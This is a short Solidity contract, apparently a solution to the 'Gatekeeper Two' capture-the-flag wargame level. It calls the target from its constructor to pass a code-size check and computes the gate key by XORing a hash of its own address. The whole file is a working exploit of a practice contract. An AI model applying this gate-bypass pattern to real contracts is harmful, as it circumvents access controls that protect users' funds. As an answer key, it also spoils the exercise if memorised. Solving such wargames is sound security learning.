// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    IGatekeeperTwo public instance;

    constructor(address _instance) public {
        instance = IGatekeeperTwo(_instance);
        attack();
    }

    function attack() public payable {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        instance.enter(gateKey);
    }
}
